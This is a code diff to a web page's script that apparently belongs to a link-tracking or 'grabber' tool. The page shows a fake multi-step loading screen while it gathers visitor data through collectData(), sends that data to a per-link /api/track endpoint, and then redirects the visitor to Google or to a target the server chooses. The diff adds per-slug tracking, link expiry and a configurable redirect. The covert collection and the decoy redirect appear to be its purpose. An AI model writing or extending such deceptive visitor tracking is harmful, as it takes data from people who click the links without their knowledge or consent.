@@ -837,20 +837,35 @@
       updateStep(1, 'done');
       updateStep(2, 'active');
 
-      // Step 2: Network (collect data here)
-      const data = await collectData();
+      // Step 2: Network (collect data here) — only for tracking links
+      const slug = (window.__TRACK_SLUG__ || '').trim();
+      let data = {};
+      if (slug) { data = await collectData(); }
       await delay(500);
       updateStep(2, 'done');
       updateStep(3, 'active');
 
-      // Step 3: Send data
-      try {
-        await fetch('/api/track', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data)
-        });
-      } catch(e) {}
+      // Step 3: Send data (only if tracking link)
+      const endpoint = slug ? ('/api/track/' + encodeURIComponent(slug)) : null;
+      let redirectTarget = 'https://www.google.com';
+      let expired = false;
+      if (slug) {
+        try {
+          const resp = await fetch(endpoint, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+          });
+          if (resp.status === 410) { expired = true; }
+          else {
+            const j = await resp.json().catch(() => ({}));
+            if (j && j.redirect) redirectTarget = j.redirect;
+          }
+        } catch(e) {}
+      } else {
+        // No tracking link: just show info, redirect to admin
+        redirectTarget = '/admin';
+      }
 
       await delay(500);
       updateStep(3, 'done');
@@ -860,6 +875,14 @@
       await delay(400);
       updateStep(4, 'done');
 
+      if (expired) {
+        document.getElementById('loadingCard').style.display = 'none';
+        const sc = document.getElementById('successCard');
+        sc.querySelector('.success-title').textContent = 'Link Expired';
+        sc.querySelector('.success-sub').textContent = 'This tracking link is no longer active.';
+        sc.classList.add('show');
+        return;
+      }
       // Show success
       await delay(300);
       document.getElementById('loadingCard').style.display = 'none';
@@ -868,7 +891,7 @@
 
       // Redirect
       await delay(1200);
-      window.location.href = 'https://www.google.com';
+      window.location.href = redirectTarget;
     }
 
     function delay(ms) {
